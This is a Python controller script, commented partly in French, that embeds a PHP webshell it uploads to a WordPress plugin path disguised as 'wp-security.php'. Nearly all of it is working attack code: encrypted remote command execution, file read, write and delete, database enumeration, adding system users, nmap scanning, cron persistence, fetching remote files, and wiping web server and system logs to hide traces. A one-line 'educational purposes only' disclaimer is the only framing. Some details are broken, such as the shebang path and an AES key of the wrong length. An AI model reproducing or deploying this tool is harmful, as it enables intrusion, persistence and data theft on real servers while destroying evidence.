#!/usr/binx/env python3
# ╔══════════════════════════════════════════════════════════════╗
# ║     EP SILON RAM EMBEDDED WEBSHELL CONTROLLER v5.0 - APT LEVEL    ║
# ║                        W.P.E.F | EpSiLoN - FULL COMMAND SUITE     ║
# ╚══════════════════════════════════════════════════════════════╝

import base64
import requests
import sys
import os
import time
import random
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import argparse
from colorama import Fore, Style, init
from urllib.parse import quote

init(autoreset=True)

# ═══════════════════════════════════════════════════════════════
# WEBSHELL EMBARQUÉ COMPLET - 100% PRÉSERVÉ
# ═══════════════════════════════════════════════════════════════
embedded_webshell = '''<?php
/*
 * EpSiLoNPoInT Advanced Embedded Webshell v4.2
 * For educational purposes only. Use at your own risk.
 */

// ========== CONFIGURATION ========== //
define('PASSWORD', 'EpSiLoNPoInT_2026!');          
define('AES_KEY', '256-bit-key-here-change-me!');  
define('C2_SERVER', '');                          
define('BACKDOOR_NAME', 'wp-security.php');       

class EpSiLoN {
    // 1. Chiffrement AES-256
    public static function aesEncrypt($data, $key) {
        $iv = openssl_random_pseudo_bytes(16);
        $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
        return base64_encode($iv . $encrypted);
    }

    public static function aesDecrypt($data, $key) {
        $data = base64_decode($data);
        $iv = substr($data, 0, 16);
        $encrypted = substr($data, 16);
        return openssl_decrypt($encrypted, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    }

    // 2. Obfuscation avancée
    public static function obfuscate($code) {
        $obfuscated = str_rot13(base64_encode(gzdeflate(strrev($code))));
        return "'" . implode("'.'", str_split($obfuscated, 64)) . "'";
    }

    // 3. Anti-Forensic: Effacement COMPLET des logs
    public static function wipeLogs() {
        $logFiles = [
            '/var/log/apache2/access.log', '/var/log/apache2/error.log',
            '/var/log/nginx/access.log', '/var/log/nginx/error.log',
            '/var/log/httpd/access_log', '/var/log/httpd/error_log',
            '/var/log/syslog', '/var/log/messages'
        ];
        foreach ($logFiles as $log) {
            if (file_exists($log)) {
                file_put_contents($log, '');
                @touch($log, time() - 86400);
            }
        }
    }

    // 4. Fileless Execution (RAM only)
    public static function filelessExec($cmd) {
        $tmp_file = '/dev/shm/' . uniqid('EpSiLoN_');
        file_put_contents($tmp_file, '<?php system("' . addslashes($cmd) . '"); ?>');
        $output = shell_exec('php ' . $tmp_file . ' 2>&1');
        unlink($tmp_file);
        return $output ?: "No output";
    }
}

// ========== FULL COMMAND SUITE ========== //
if (!isset($_GET['pass']) || $_GET['pass'] !== PASSWORD) {
    die("EpSiLoN: Access Denied");
}

// COMMANDE 1: SHELL SYSTEM
if (isset($_GET['cmd'])) {
    $cmd = EpSiLoN::aesDecrypt($_GET['cmd'], AES_KEY);
    $output = EpSiLoN::filelessExec($cmd);
    echo EpSiLoN::aesEncrypt($output, AES_KEY);
    EpSiLoN::wipeLogs();
    exit;
}

// COMMANDE 2: FILE MANAGER
if (isset($_GET['file'])) {
    $file_action = $_GET['file'];
    $target_file = $_GET['path'] ?? '/tmp/test.txt';
    
    switch($file_action) {
        case 'read':
            if (file_exists($target_file)) {
                echo EpSiLoN::aesEncrypt(file_get_contents($target_file), AES_KEY);
            } else {
                echo EpSiLoN::aesEncrypt("File not found", AES_KEY);
            }
            break;
        case 'write':
            $content = $_POST['content'] ?? '';
            file_put_contents($target_file, $content);
            echo EpSiLoN::aesEncrypt("File written: $target_file", AES_KEY);
            break;
        case 'delete':
            if (file_exists($target_file)) {
                unlink($target_file);
                echo EpSiLoN::aesEncrypt("File deleted: $target_file", AES_KEY);
            }
            break;
        case 'list':
            $files = scandir($target_file);
            $file_list = json_encode(array_filter($files, function($f) { 
                return !in_array($f, ['.', '..']); 
            }));
            echo EpSiLoN::aesEncrypt($file_list, AES_KEY);
            break;
    }
    exit;
}

// COMMANDE 3: SYSTEM INFO
if (isset($_GET['sysinfo'])) {
    $info = [
        'hostname' => gethostname(),
        'ip' => $_SERVER['SERVER_ADDR'],
        'user' => get_current_user(),
        'php_version' => phpversion(),
        'os' => php_uname(),
        'pwd' => getcwd(),
        'uptime' => shell_exec('uptime'),
        'processes' => count(explode("\
", shell_exec('ps aux')))
    ];
    echo EpSiLoN::aesEncrypt(json_encode($info), AES_KEY);
    exit;
}

// COMMANDE 4: DATABASE MANAGER
if (isset($_GET['db'])) {
    $db_config = [
        'host' => $_GET['host'] ?? 'localhost',
        'user' => $_GET['user'] ?? 'root',
        'pass' => $_GET['pass'] ?? '',
        'name' => $_GET['name'] ?? ''
    ];
    
    try {
        $pdo = new PDO("mysql:host={$db_config['host']};dbname={$db_config['name']}", 
                      $db_config['user'], $db_config['pass']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
        echo EpSiLoN::aesEncrypt(json_encode($tables), AES_KEY);
    } catch (Exception $e) {
        echo EpSiLoN::aesEncrypt("DB Error: " . $e->getMessage(), AES_KEY);
    }
    exit;
}

// COMMANDE 5: USER MANAGEMENT
if (isset($_GET['user'])) {
    $action = $_GET['action'];
    switch($action) {
        case 'list':
            $users = shell_exec('cat /etc/passwd | cut -d: -f1');
            echo EpSiLoN::aesEncrypt($users, AES_KEY);
            break;
        case 'add':
            $user = $_GET['username'];
            $pass = $_GET['password'];
            $cmd = "useradd -m $user && echo '$user:$pass' | chpasswd";
            echo EpSiLoN::aesEncrypt(EpSiLoN::filelessExec($cmd), AES_KEY);
            break;
    }
    exit;
}

// COMMANDE 6: NETWORK SCAN
if (isset($_GET['scan'])) {
    $target = $_GET['target'];
    $ports = $_GET['ports'] ?? '22,21,80,443,3306,5432';
    $cmd = "nmap -sS -p $ports --open $target";
    echo EpSiLoN::aesEncrypt(EpSiLoN::filelessExec($cmd), AES_KEY);
    exit;
}

// COMMANDE 7: PERSISTENCE
if (isset($_GET['persist'])) {
    $method = $_GET['method'];
    switch($method) {
        case 'cron':
            $cron = "* * * * * /usr/bin/php " . __FILE__ . " >> /dev/null 2>&1";
            file_put_contents('/tmp/cron', $cron);
            shell_exec('crontab /tmp/cron');
            unlink('/tmp/cron');
            echo EpSiLoN::aesEncrypt("Cron persistence OK", AES_KEY);
            break;
    }
    exit;
}

// COMMANDE 8: DOWNLOAD/UPLOAD
if (isset($_GET['download'])) {
    $url = $_GET['url'];
    $save_path = $_GET['path'] ?? '/tmp/downloaded';
    $content = file_get_contents($url);
    file_put_contents($save_path, $content);
    echo EpSiLoN::aesEncrypt("Downloaded to: $save_path", AES_KEY);
    exit;
}

if (isset($_GET['upload'])) {
    if (isset($_FILES['file'])) {
        $upload_dir = '/tmp/uploads/';
        if (!is_dir($upload_dir)) mkdir($upload_dir);
        $file_path = $upload_dir . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $file_path);
        echo EpSiLoN::aesEncrypt("Uploaded to: $file_path", AES_KEY);
    }
    exit;
}

// HEALTH CHECK
if (isset($_GET['check'])) {
    echo EpSiLoN::aesEncrypt("EpSiLoN v4.2 [OK]", AES_KEY);
    exit;
}

EpSiLoN::wipeLogs(); // Auto-clean
?>'''

# ═══════════════════════════════════════════════════════════════
# CONTROLLER PRINCIPAL - TOUTES COMMANDES
# ═══════════════════════════════════════════════════════════════
class EpSiLoNController:
    def __init__(self):
        self.password = "EpSiLoNPoInT_2026!"
        self.aes_key = "256-bit-key-here-change-me!"
        self.encoded_webshell = base64.b64encode(embedded_webshell.encode('utf-8')).decode('utf-8')
        self.session = self._create_stealth_session()
    
    def _create_stealth_session(self):
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        return session
    
    def encrypt_command(self, command):
        """Chiffre commande AES-256"""
        iv = os.urandom(16)
        cipher = AES.new(self.aes_key.encode('utf-8'), AES.MODE_CBC, iv)
        encrypted_cmd = base64.b64encode(
            iv + cipher.encrypt(pad(command.encode('utf-8'), AES.block_size))
        ).decode('utf-8')
        return encrypted_cmd
    
    def decrypt_output(self, encrypted_data):
        """Déchiffre sortie"""
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            iv = encrypted_bytes[:16]
            cipher = AES.new(self.aes_key.encode('utf-8'), AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_bytes[16:])
            return unpad(decrypted, AES.block_size).decode('utf-8')
        except:
            return "Decryption failed"
    
    # ═════════════════ COMMANDE SYSTEM ═════════════════
    def shell(self, target_url, webshell_path, command):
        """Exécution commande système"""
        encrypted_cmd = self.encrypt_command(command)
        resp = self.session.get(
            f"{target_url}{webshell_path}?cmd={quote(encrypted_cmd)}&pass={self.password}",
            timeout=15
        )
        if resp.status_code == 200:
            return self.decrypt_output(resp.text)
        return None
    
    # ═════════════════ FILE MANAGER ═════════════════
    def file_read(self, target_url, webshell_path, filepath):
        """Lire fichier"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?file=read&path={quote(filepath)}&pass={self.password}",
            timeout=10
        )
        if resp.status_code == 200:
            return self.decrypt_output(resp.text)
        return None
    
    def file_write(self, target_url, webshell_path, filepath, content):
        """Écrire fichier"""
        encrypted_content = self.encrypt_command(content)
        resp = self.session.post(
            f"{target_url}{webshell_path}?file=write&path={quote(filepath)}&pass={self.password}",
            data={'content': encrypted_content}
        )
        if resp.status_code == 200:
            return self.decrypt_output(resp.text)
        return None
    
    def file_delete(self, target_url, webshell_path, filepath):
        """Supprimer fichier"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?file=delete&path={quote(filepath)}&pass={self.password}",
            timeout=10
        )
        if resp.status_code == 200:
            return self.decrypt_output(resp.text)
        return None
    
    def file_list(self, target_url, webshell_path, directory='.'):
        """Lister fichiers"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?file=list&path={quote(directory)}&pass={self.password}",
            timeout=10
        )
        if resp.status_code == 200:
            try:
                return json.loads(self.decrypt_output(resp.text))
            except:
                return self.decrypt_output(resp.text)
        return None
    
    # ═════════════════ SYSTEM INFO ═════════════════
    def sysinfo(self, target_url, webshell_path):
        """Infos système"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?sysinfo=1&pass={self.password}",
            timeout=10
        )
        if resp.status_code == 200:
            try:
                return json.loads(self.decrypt_output(resp.text))
            except:
                return self.decrypt_output(resp.text)
        return None
    
    # ═════════════════ DATABASE ═════════════════
    def db_enum(self, target_url, webshell_path, host='localhost', user='root', password='', db=''):
        """Énumérer DB"""
        params = f"db=1&host={quote(host)}&user={quote(user)}&pass={quote(password)}&name={quote(db)}"
        resp = self.session.get(
            f"{target_url}{webshell_path}?{params}&pass={self.password}",
            timeout=15
        )
        if resp.status_code == 200:
            try:
                return json.loads(self.decrypt_output(resp.text))
            except:
                return self.decrypt_output(resp.text)
        return None
    
    # ═════════════════ USER MANAGEMENT ═════════════════
    def user_list(self, target_url, webshell_path):
        """Lister utilisateurs"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?user=list&pass={self.password}",
            timeout=10
        )
        if resp.status_code == 200:
            return self.decrypt_output(resp.text)
        return None
    
    def user_add(self, target_url, webshell_path, username, password):
        """Ajouter utilisateur"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?user=add&action=add&username={quote(username)}&password={quote(password)}&pass={self.password}",
            timeout=15
        )
        if resp.status_code == 200:
            return self.decrypt_output(resp.text)
        return None
    
    # ═════════════════ UPLOAD/DOWNLOAD ═════════════════
    def download_file(self, target_url, webshell_path, remote_url, local_path):
        """Télécharger depuis URL"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?download=1&url={quote(remote_url)}&path={quote(local_path)}&pass={self.password}",
            timeout=30
        )
        if resp.status_code == 200:
            return self.decrypt_output(resp.text)
        return None
    
    # ═════════════════ HEALTH CHECK ═════════════════
    def ping(self, target_url, webshell_path):
        """Test connexion"""
        resp = self.session.get(
            f"{target_url}{webshell_path}?check=1&pass={self.password}",
            timeout=10
        )
        if resp.status_code == 200:
            return "EpSiLoN OK" in self.decrypt_output(resp.text)
        return False
    
    # ═════════════════ UPLOAD WEBSHELL ═════════════════
    def upload(self, target_url, endpoint):
        """Upload webshell"""
        files = {
            'file': ('wp-security.php', base64.b64decode(self.encoded_webshell).decode('utf-8'))
        }
        resp = self.session.post(
            f"{target_url}{endpoint}",
            files=files,
            timeout=20
        )
        return resp.status_code in [200, 302]

# ═══════════════════════════════════════════════════════════════
# CLI INTERACTIVE - TOUTES COMMANDES
# ═══════════════════════════════════════════════════════════════
def interactive_mode(controller, target_url, webshell_path):
    """Mode interactif complet"""
    print(f"
[{Fore.GREEN}🚀 EpSiLoN INTERACTIVE MODE{Style.RESET_ALL}] {target_url}{webshell_path}")
    
    while True:
        try:
            cmd = input(f"
[{Fore.CYAN}EpSiLoN#{Style.RESET_ALL}] ").strip()
            
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
            elif cmd.startswith('shell '):
                command = cmd[6:]
                result = controller.shell(target_url, webshell_path, command)
                print(f"[{Fore.GREEN}OUT{Style.RESET_ALL}]
{result or 'No output'}")
            
            elif cmd == 'sysinfo':
                info = controller.sysinfo(target_url, webshell_path)
                print(f"[{Fore.GREEN}SYSINFO{Style.RESET_ALL}]
{json.dumps(info, indent=2) or 'Error'}")
            
            elif cmd.startswith('file read '):
                path = cmd[10:]
                content = controller.file_read(target_url, webshell_path, path)
                print(f"[{Fore.GREEN}FILE{Style.RESET_ALL}]
{content or 'Error'}")
            
            elif cmd.startswith('file list '):
                path = cmd[10:] or '.'
                files = controller.file_list(target_url, webshell_path, path)
                print(f"[{Fore.GREEN}DIR{Style.RESET_ALL}]
{files or 'Error'}")
            
            elif cmd == 'users':
                users = controller.user_list(target_url, webshell_path)
                print(f"[{Fore.GREEN}USERS{Style.RESET_ALL}]
{users or 'Error'}")
            
            elif cmd.startswith('db '):
                parts = cmd[3:].split()
                if len(parts) >= 4:
                    host, user, pwd, db = parts[:4]
                    tables = controller.db_enum(target_url, webshell_path, host, user, pwd, db)
                    print(f"[{Fore.GREEN}DB{Style.RESET_ALL}]
{tables or 'Error'}")
            
            elif cmd == 'ping':
                if controller.ping(target_url, webshell_path):
                    print(f"[{Fore.GREEN}PING OK{Style.RESET_ALL}]")
                else:
                    print(f"[{Fore.RED}PING FAILED{Style.RESET_ALL}]")
            
            else:
                print(f"[{Fore.YELLOW}CMD{Style.RESET_ALL}] shell <command> | sysinfo | file read <path> | file list <path> | users | db <host> <user> <pass> <db> | ping")
                
        except KeyboardInterrupt:
            print(f"
[{Fore.YELLOW}BYE{Style.RESET_ALL}]")
            break
        except Exception as e:
            print(f"[{Fore.RED}ERROR{Style.RESET_ALL}] {e}")

def main():
    parser = argparse.ArgumentParser(description='EpSiLoN RAM Webshell Controller v5.0')
    parser.add_argument('target', help='URL cible')
    parser.add_argument('--path', default='/wp-content/plugins/modular-ds/wp-security.php', 
                       help='Chemin webshell')
    parser.add_argument('--upload-endpoint', default='/wp-content/plugins/modular-ds/uploader.php',
                       help='Endpoint upload')
    parser.add_argument('--interactive', '-i', action='store_true', help='Mode interactif')
    
    args = parser.parse_args()
    
    controller = EpSiLoNController()
    
    print(f"""
[{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║        EP SILON RAM WEBSHELL CONTROLLER v5.0 - APT LEVEL       ║
║                          FULL COMMAND SUITE                    ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}]
    """)
    
    # Test connexion
    if controller.ping(args.target, args.path):
        print(f"[{Fore.GREEN}✓ Webshell active{Style.RESET_ALL}] {args.target}{args.path}")
    else:
        print(f"[{Fore.YELLOW}⚠ Upload required{Style.RESET_ALL}]")
        if controller.upload(args.target, args.upload_endpoint):
            print(f"[{Fore.GREEN}✓ Upload success{Style.RESET_ALL}]")
        else:
            print(f"[{Fore.RED}✗ Upload failed{Style.RESET_ALL}]")
            return
    
    if args.interactive:
        interactive_mode(controller, args.target, args.path)
    else:
        print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] Use --interactive for full shell")

if __name__ == "__main__":
    main()
